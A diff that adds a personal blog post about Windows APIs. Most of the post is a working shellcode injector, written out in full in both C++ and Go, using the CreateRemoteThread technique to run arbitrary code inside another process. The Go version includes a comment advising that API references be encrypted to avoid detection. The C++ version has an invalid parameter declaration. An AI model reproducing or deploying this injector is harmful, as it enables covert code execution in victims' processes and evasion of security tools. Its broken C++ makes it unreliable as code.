@@ -1,0 +1,172 @@
+---
+title: "Approaching Windows"
+date: 2021-06-01T00:41:45+02:00
+draft: false
+toc: false
+images:
+tags:
+  - 0x03
+  - windows
+  - api 
+  - clueless
+  - cpp
+  - c++
+  - go
+ 
+---
+
+Well, hello there! Last few weeks have been a little busy between my mere analog life and ~~pwning industrial ovens~~ work.
+Lately I have been banging my head against this thing known as **Windows**. 
+
+Its APIs to be precise, as I am trying to move out of my comfort zone of "development" (I am by **no means** a developer, but when I make stuff, it's usually on Linux). 
+
+As a side note, while we're talking about development, I recently decided to produce a rip-off of the amazing [xsshunter](https://xsshunter.com) and write it in Go. 
+Mostly as a learning exercise for Go stuff. It's coded like shit, and currenty on the low priority list, so feel free to hop in and [help](https://github.com/thatsn0tmysite/xsserve).
+
+Now, back to Windows. While there are a lot of complaints I have, mostly about situations where you read the documentation and end up facing a dead end because whatever you are looking at is undocumented... and the only information you can find about the topic is from some temporary account on codeproject, which made a stackoverflow question 8 years ago, which he self-answered. For Windows XP, SP1.
+
+Looking at you "dwData" pointers...
+
+So, to try and keep this post half-useful, I am gonna paste here a shellcode injector written in both, C++ and Go; using the overly (ab)used CreateRemoteThread technique.
+
+The idea is simple, we just create a thread on a remote process, and give it our shellcode to run, this will run inside another process and will stay "in memory". 
+To do this we will need a way obtain a handle of a give process (**OpenProcess**), to allocate memory area and make it executable (**VirtualAllocEx** and **VirtualProtectEx**), to write to said area (**WriteProcessMemory**) and finally a way to create the remote thread  (**CreateRemoteThread**).
+
+This is a pretty standard way. So let's get threading!
+
+```C++
+#include <windows.h>
+#include <processthreadsapi.h>
+#include <memoryapi.h>
+
+int Inj_CreateRemoteThread(UINT pid, BYTE[] shellcode, SIZE_T sh_size) {
+	HANDLE hProc, hThread;
+	LPVOID lpStartAddress;
+	int writeProcError;
+	DWORD lpflOldProtect = PAGE_READWRITE;
+
+	//Get a handle from the given pid
+	hProc = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pid);
+	if (!hProc) {
+		return -1;
+	}
+
+	//Allocate some space into the remote process, big enough to host our shellcode.	
+	lpStartAddress = (LPVOID)VirtualAllocEx(hProc, NULL, sh_size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	if (lpStartAddress == NULL) {
+		return -2;
+	}
+
+	//Write our shellcode to the allocated memory on the remote process,
+	writeProcError = WriteProcessMemory(hProc, lpStartAddress, shellcode, sh_size, NULL);
+	if (writeProcError == 0) {
+		return -3;
+	}
+
+	//Create & run a remote thread which points to the start of the memory holding the shellcode
+	//we are discarding the handle to the thread, this might not be what you want in a real scenario.
+	hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)lpStartAddress, NULL, 0, NULL);
+	if (hThread == NULL) {
+		return -5;
+	}
+
+	//Close the open handles
+	CloseHandle(hProc);
+
+	return 0;
+}
+```
+
+And now the exact same thing, but in Go:
+
+```go
+import (
+	"syscall"
+	"unsafe"
+	"golang.org/x/sys/windows"
+)
+
+var (
+	//DLLs
+	kernel32 = syscall.NewLazyDLL("kernel32.dll")
+	user32   = syscall.NewLazyDLL("user32.dll")
+	ntdll    = syscall.NewLazyDLL("ntdll.dll")
+)
+
+const (
+	PAGE_EXECUTE_READWRITE = 0x40
+	PAGE_EXECUTE_READ      = 0x20
+	PROCESS_ALL_ACCESS     = 0x1F0FFF
+)
+
+func Inj_CreateRemoteThread(pid int, shellcode []byte) (err error) {
+	//You might want to encrypt references, these may look vErY SuSpIcIouS ;)
+	virtualAllocEx := kernel32.NewProc("VirtualAllocEx")
+	openProcess := kernel32.NewProc("OpenProcess")
+	virtualProtectEx := kernel32.NewProc("VirtualProtectEx")
+	writeProcessMemory := kernel32.NewProc("WriteProcessMemory")
+	createRemoteThread := kernel32.NewProc("CreateRemoteThread")
+	closeHandle := kernel32.NewProc("CloseHandle")
+
+	memProtect := windows.PAGE_READWRITE
+
+	//Get a handle from the given pid
+	handle, _, err := openProcess.Call(PROCESS_ALL_ACCESS, 0, uintptr(pid))
+	if isErr(err) != nil {
+		return err
+	}
+
+	//Allocate some space into the remote process, big enough to host our shellcode.
+	lpStartAddress, _, err := virtualAllocEx.Call(uintptr(handle), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
+	if isErr(err) != nil {
+		return err
+	}
+
+	//Write our shellcode to the allocated memory on the remote process
+	_, _, err = writeProcessMemory.Call(uintptr(handle), lpStartAddress, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), 0)
+	if isErr(err) != nil {
+		return err
+	}
+
+	//Change the memory to be executable
+	//WARN: this is unneeded if we change VirtualAllocEx to set the memory as PAGE_EXECUTE_READWRITE
+	_, _, err = virtualProtectEx.Call(uintptr(handle), lpStartAddress, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&memProtect)))
+	if isErr(err) != nil {
+		return err
+	}
+
+	//Create & run a remote thread which points to the start of the memory holding the shellcode
+	//we are discarding the handle to the thread, this might not be what you want in a real scenario.
+	_, _, err = createRemoteThread.Call(uintptr(handle), 0, 0, lpStartAddress, 0, 0, 0)
+	if isErr(err) != nil {
+		return err
+	}
+
+	//Close the process handle
+	_, _, err = closeHandle.Call(uintptr(handle))
+	if isErr(err) != nil {
+		return err
+	}
+
+	return nil
+}
+```
+
+As you see, the process is almost the same, mostly thanks to the **golang.org/x/sys/windows**  package. Now, in a real-world scenario just plain injecting the shellcode may not be as easy, as the injector is still highly easy to spot (common API pattern, cleartext references, etc).
+
+Anyhow, Windows makes it generally pretty straight forward to perform operations on remote processes, no wonder userspace malwares are so popular! They are easy to implement, quick to develop and if they get caught, well... just make a new one.
+
+I do plan on eventually sharing other snippets for stuff I find interesting, Windows-related... this is if I don't get slapped to numbness with a printed version of MSDN by my friend that has been trying to get me to learn all this shit. 
+
+Over and out.
+
+-----------
+
+**Update:**
+
+As I was testing (and correcting) the C++ code I noticed there was a useless step in the function: I was allocating an area as Read-Write and only later modifying it to be executable.
+This was indeed unneeded. 
+
+While it worked, one can totally skip the **VirtualProtectEx** in the Go version, and just do as the updated C++ code: calling **VirtualAllocEx** with `PAGE_EXECUTE_READ_WRITE`.
+
+I'll leave the Go version as a reference for stupid code and use this as an excuse to avoid modifying it because I really want to watch another episode of Battlestar Galactica, instead of removing a few lines of code. I'm lazy, fight me...or don't, it's less tiring.
